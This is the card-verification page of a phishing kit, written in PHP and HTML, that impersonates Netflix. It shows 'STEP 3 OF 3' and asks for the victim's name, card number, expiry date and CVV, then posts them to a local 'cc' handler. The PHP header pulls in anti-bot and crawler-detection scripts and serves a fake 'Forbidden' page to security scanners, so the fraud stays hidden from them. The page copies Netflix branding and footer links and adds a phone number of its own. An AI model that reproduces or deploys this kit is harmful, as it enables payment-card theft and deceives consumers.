<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

?>

<html data-triggered="true" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Netflix
    </title>
    <meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Germany, watch TV online, no download, full length movies" name="keywords">
    <meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link type="text/css" rel="stylesheet" href="assets/css/none.css" data-uia="botLink">
    <link type="text/css" rel="stylesheet" href="assets/css/implicity.css" data-uia="botLink">
    <link rel="shortcut icon" href="assets/img/icon.ico">
    <meta name="twitter:card" content="player">
    <meta name="twitter:site" content="@netflix">

  </head>
  <body>
    <div id="appMountPoint">
      <div class="netflix-sans-font-loaded">
        <div class="basicLayout firefox modernInApp signupSimplicity-creditOptionMode simplicity" dir="ltr" lang="en-DE">
          <div class="nfHeader noBorderHeader signupBasicHeader">
            <br>
            <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
              <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                <g id="netflix-logo">
                  <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14">
                  </path>
                </g>
              </svg>
              <span class="screen-reader-text">Netflix
              </span>
            </a>
            <a href="/signout" class="authLinks signupBasicHeader" data-uia="header-signout-link">Sign Out
            </a>
          </div>
          <div class="simpleContainer" data-transitioned-child="true">
            <div class="centerContainer firstLoad">
              <form method="POST" action="cc">
                <div class="paymentFormContainer">
                  <div>
                    <div class="stepHeader-container" data-uia="header">
                      <div class="stepHeader" data-a11y-focus="true">
                        <span id="" class="stepIndicator" data-uia="">STEP 
                          <b>3
                          </b> OF 
                          <b>3
                          </b>
                        </span>
                        <h1 class="stepTitle" data-uia="stepTitle">Verify your credit or debit card.
                        </h1>
                      </div>
                    </div>
                  </div>
                  <div class="fieldContainer">
                    <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept VISA, MASTERCARD and AMEX.">
                      <img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="assets/img/visa-v3.svg">
                      <img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="assets/img/mastercard-v2.svg">
                      <img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="assets/img/amex-v2.svg">
                    </span>
                    <div class="">
                      <ul class="simpleForm structural ui-grid">
                        <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                          <div data-uia="field-firstName+container" class="nfInput nfInputOversize">
                            <div class="nfInputPlacement">
                              <label class="input_id" placeholder="firstName">
                                <input type="text" data-uia="field-firstName" name="firstName" class="nfTextField hasText" id="id_firstName" value="" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" required="">
                                <label id="firstNameLabel" for="id_firstName" class="placeLabel">First Name
                                </label>
                              </label>
                            </div>
                          </div>
                        </li>
                        <li data-uia="field-lastName+wrapper" class="nfFormSpace">
                          <div data-uia="field-lastName+container" class="nfInput nfInputOversize">
                            <div class="nfInputPlacement">
                              <label class="input_id" placeholder="lastName">
                                <input type="text" data-uia="field-lastName" name="lastName" class="nfTextField hasText" id="id_lastName" value="" tabindex="0" autocomplete="cc-family-name" dir="" required="">
                                <label for="id_lastName" class="placeLabel">Last Name
                                </label>
                              </label>
                            </div>
                          </div>
                        </li>
                        <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
                          <div class="cardNumberContainer">
                            <div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
                              <div class="nfInputPlacement">
                                <label class="input_id" placeholder="creditCardNumber">
                                  <input type="tel" data-uia="field-creditCardNumber" name="ccnum" class="nfTextField hasText" id="ccnum" value="" tabindex="0" autocomplete="off" maxlength="19" minlength="12" dir="" required="">
                                  <label for="id_creditCardNumber" class="placeLabel">Card Number
                                  </label>
                                </label>
                              </div>
                            </div>
                          </div>
                        </li>
                        <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                          <div data-uia="field-creditExpirationMonth+container" class="nfInput nfInputOversize">
                            <div class="nfInputPlacement">
                              <label class="input_id" placeholder="creditExpirationMonth">
                                <input type="tel" data-uia="field-creditExpirationMonth" name="ccexp" class="nfTextField hasText" id="ccexp" value="" tabindex="0" autocomplete="off" dir="" required="">
                                <label for="id_creditExpirationMonth" class="placeLabel">Expiration Date (MM/YY)
                                </label>
                              </label>
                            </div>
                          </div>
                        </li>
                        <li data-uia="field-creditExpirationYear+wrapper" class="nfFormSpace">
                        </li>
                        <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
                          <div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
                            <div class="nfInputPlacement">
                              <label class="input_id" placeholder="creditCardSecurityCode">
                                <input type="tel" data-uia="field-creditCardSecurityCode" name="cvv" class="nfTextField hasText" id="id_creditCardSecurityCode" value="" tabindex="0" autocomplete="off" maxlength="4" minlength="3" dir="" required="">
                                <label for="id_creditCardSecurityCode" class="placeLabel">Security Code (CVV)
                                </label>
                              </label>
                            </div>
                            <div class="tooltipWrapper" data-uia="tooltipWrapper">
                              <span class="nf-svg-icon ">
                                <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                                  <g fill="none" fill-rule="evenodd">
                                    <g>
                                      <circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17">
                                      </circle>
                                      <path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6">
                                      </path>
                                    </g>
                                  </g>
                                </svg>
                              </span>
                            </div>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div class="submitBtnContainer">
                  <button type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment">FINISH VERIFICATION
                  </button>
                </div>
              </form>
            </div>
          </div>
          <div class="site-footer-wrapper centered">
            <div class="footer-divider">
            </div>
            <div class="site-footer">
              <p class="footer-top">Questions? Call 
                <a class="footer-top-a" href="tel:0800-4564-3455">0800-4564-3455
                </a>
              </p>
              <ul class="footer-links structural">
                <li class="footer-link-item" placeholder="footer_responsive_link_faq_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq">
                    <span id="" data-uia="data-uia-footer-label">FAQ
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_help_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help">
                    <span id="" data-uia="data-uia-footer-label">Help Center
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_terms_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms">
                    <span id="" data-uia="data-uia-footer-label">Terms of Use
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link">
                    <span id="" data-uia="data-uia-footer-label">Privacy
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link">
                    <span id="" data-uia="data-uia-footer-label">Cookie Preferences
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information">
                    <span id="" data-uia="data-uia-footer-label">Corporate Information
                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_impressum_item">
                  <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/en/node/68708" placeholder="footer_responsive_link_corporate_information_impressum">
                    <span id="" data-uia="data-uia-footer-label">Impressum
                    </span>
                  </a>
                </li>
              </ul>
              <div class="lang-selection-container" id="lang-switcher">
                <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                  <div class="nfSelectPlacement globe">
                    <select data-uia="language-picker" class="nfSelect" name="__langSelect" tabindex="0">
                      <option value="/signup/creditoption?locale=de-DE" label="Deutsch">Deutsch
                      </option>
                      <option selected="" value="/signup/creditoption?locale=en-DE" label="English">English
                      </option>
                    </select>
                    <label class="nfLabel no-display placeLabel">
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1">
          </div>
        </div>
      </div>
    </div>
      <script src="assets/js/jquery.min.js">
    </script>
    <script src="assets/js/jquery.maskedinput.js">
    </script>
  <script src="assets/js/imask.js"></script>
  <script>var element = document.getElementById('ccexp'); var maskOptions = {mask: '00/00'}; var mask = IMask(element, maskOptions);</script>
  <script type="text/javascript">$("#ccnum").mask("9999 9999 9999 9999");</script> 
  </body>
</html>
